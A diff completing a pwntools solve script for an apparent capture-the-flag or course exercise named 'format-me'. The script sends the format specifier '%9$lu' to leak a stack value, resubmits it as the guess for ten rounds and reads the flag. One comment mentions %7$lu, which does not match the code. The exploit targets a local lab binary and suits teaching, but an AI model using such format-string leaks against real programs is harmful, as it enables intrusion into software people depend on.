@@ -2,22 +2,40 @@
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
-exe = ELF("./format-me-test")
+exe = ELF("format-me")
 
 r = process([exe.path])
-# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
+#r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
 
-for _ in range(10):
-    # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
-    leak = r.recvline()
-    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
+for i in range(10):
+    # Receive the "Recipient?" prompt
+    r.recvuntil(b"Recipient? ")
     
-    r.recvuntil(b"xxx") #Think about what should be received?
-    r.sendline(val) 
+    # Send format string to leak the code value from stack
+    # The code variable is typically at offset 7 or 8 on the stack
+    # We use %7$lu to read the 7th argument as an unsigned long
+    r.sendline(b"%9$lu")
+    
+    # Receive the leaked value
+    r.recvuntil(b"Sending to ")
+    leak = r.recvline()
+    
+    # Extract the numeric value from the leaked line
+    # Format: "12345678...\n"
+    val = leak.strip()
+    
+    # Receive the "Guess?" prompt
+    r.recvuntil(b"Guess? ")
+    
+    # Send the leaked code value as our guess
+    r.sendline(val)
+    
+    # Wait for confirmation
     r.recvuntil(b"Correct")
+    
+    print(f"[+] Round {i+1}/10 completed")
 
+# Receive and print the flag
 r.recvuntil(b"Here's your flag: ")
-r.interactive()
+print(r.recvline().decode())
+r.close()
